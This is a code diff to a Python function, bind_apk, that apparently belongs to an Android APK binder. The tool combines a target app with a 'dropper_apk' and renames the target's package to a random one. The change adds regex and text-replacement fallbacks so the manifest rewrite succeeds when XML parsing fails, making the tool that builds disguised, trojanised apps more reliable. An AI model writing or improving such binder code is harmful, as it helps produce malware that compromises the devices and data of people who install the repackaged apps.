@@ -1737,14 +1737,26 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
         target_root = None
         target_tree = None
         target_manifest_path = os.path.join(target_work_dir, 'AndroidManifest.xml')
+        _manifest_raw = None   # raw text — used by regex fallback below
         try:
             target_tree = ET.parse(target_manifest_path)
             target_root = target_tree.getroot()
             target_package = target_root.get('package')
             if target_package:
                 target_package_name = target_package
-        except:
-            pass
+        except Exception as _et_err:
+            # ET.parse can fail on manifests with BOM, unusual namespace
+            # declarations, or non-UTF-8 encoding that apktool sometimes emits.
+            # Fall back to raw-text regex extraction.
+            try:
+                with open(target_manifest_path, 'r', encoding='utf-8', errors='replace') as _mf:
+                    _manifest_raw = _mf.read()
+                import re as _re
+                _pkg_m = _re.search(r'\bpackage\s*=\s*["\']([A-Za-z][A-Za-z0-9_.]+)["\']', _manifest_raw)
+                if _pkg_m:
+                    target_package_name = _pkg_m.group(1)
+            except Exception:
+                pass
 
         new_target_package = generate_random_package()
         print(f"[+] Changing target package: {target_package_name} -> {new_target_package}")
@@ -1782,7 +1794,7 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
 
         try:
             if target_root is None:
-                raise ValueError("manifest not parsed")
+                raise ValueError("manifest not parsed by ET")
             app_element = target_root.find('application')
             if app_element is not None:
                 app_name_attr = app_element.get('{http://schemas.android.com/apk/res/android}name')
@@ -1814,10 +1826,24 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
 
             target_root.set('package', new_target_package)
             target_tree.write(target_manifest_path, encoding='utf-8', xml_declaration=True)
-            print("    Target package updated in manifest")
-        except Exception as e:
-            print(f"    note: target package update: {e}")
-            new_target_package = target_package_name
+            print("    Target package updated in manifest (ET)")
+        except Exception as _et_upd_err:
+            # ET path failed — try raw text replacement on the manifest file.
+            # This handles manifests with BOM / non-standard XML that ET can't
+            # round-trip but that apktool wrote as plain text we can sed.
+            if _manifest_raw and target_package_name != "com.example.app":
+                try:
+                    import re as _re
+                    _patched = _manifest_raw.replace(target_package_name, new_target_package)
+                    with open(target_manifest_path, 'w', encoding='utf-8') as _mf_w:
+                        _mf_w.write(_patched)
+                    print(f"    Target package updated in manifest (text fallback)")
+                except Exception as _txt_err:
+                    print(f"    note: target package update failed: {_txt_err}")
+                    new_target_package = target_package_name
+            else:
+                print(f"    note: target package update skipped: {_et_upd_err}")
+                new_target_package = target_package_name
 
         # purge empty smali files — apktool parser fails on 0-byte .smali
         _empty = 0
